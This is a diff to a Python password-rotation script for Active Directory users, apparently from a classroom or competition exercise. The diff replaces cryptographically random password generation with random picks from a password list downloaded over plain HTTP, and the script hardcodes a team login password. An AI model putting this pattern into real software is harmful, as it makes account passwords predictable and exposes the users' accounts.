@@ -1,7 +1,6 @@
 import subprocess
 import requests
-import secrets
-import string
+import random
 import csv
 import time
 
@@ -12,6 +11,7 @@ BASE_DN = "dc=steel,dc=texas,dc=tu"
 
 LOGIN_URL = "http://webapps.classex.tu/webpass/"
 PASSWORD_PAGE = "http://webapps.classex.tu/webpass/index.php"
+PASSWORD_LIST_URL = "http://webapps.classex.tu/webpass/passwords.txt"
 
 TEAM_NAME = "texas"
 TEAM_PASSWORD = "pleaseStopT@kingMyMoney"
@@ -29,17 +29,6 @@ NO_PASSWORD_CHANGE = [
     "TexasAdmin",
     "Tx-steel\\administrator"
 ]
-
-
-def generate_base_password(length=12):
-
-    letters = string.ascii_letters
-    numbers = string.digits
-    symbols = "!@#$^*_-"
-
-    alphabet = letters + numbers + symbols
-
-    return "".join(secrets.choice(alphabet) for _ in range(length))
 
 
 def get_users_from_ad():
@@ -78,6 +67,27 @@ def get_users_from_ad():
     return users
 
 
+def download_password_list():
+
+    r = requests.get(PASSWORD_LIST_URL)
+
+    passwords = []
+
+    for line in r.text.splitlines():
+
+        word = line.strip()
+
+        if word:
+            passwords.append(word)
+
+    return passwords
+
+
+def generate_base_password(password_list):
+
+    return random.choice(password_list)
+
+
 def login_texas(session):
 
     payload = {
@@ -93,7 +103,7 @@ def verify_password_page(session):
     session.get(PASSWORD_PAGE)
 
 
-def rotate_passwords(session, users):
+def rotate_passwords(session, users, password_list):
 
     with open(OUTPUT_FILE, "w", newline="") as file:
 
@@ -102,7 +112,7 @@ def rotate_passwords(session, users):
 
         for index, username in enumerate(users, 1):
 
-            base_password = generate_base_password()
+            base_password = generate_base_password(password_list)
 
             payload = {
                 "user": username,
@@ -123,13 +133,15 @@ def main():
 
     users = get_users_from_ad()
 
+    password_list = download_password_list()
+
     session = requests.Session()
 
     login_texas(session)
 
     verify_password_page(session)
 
-    rotate_passwords(session, users)
+    rotate_passwords(session, users, password_list)
 
 
 if __name__ == "__main__":
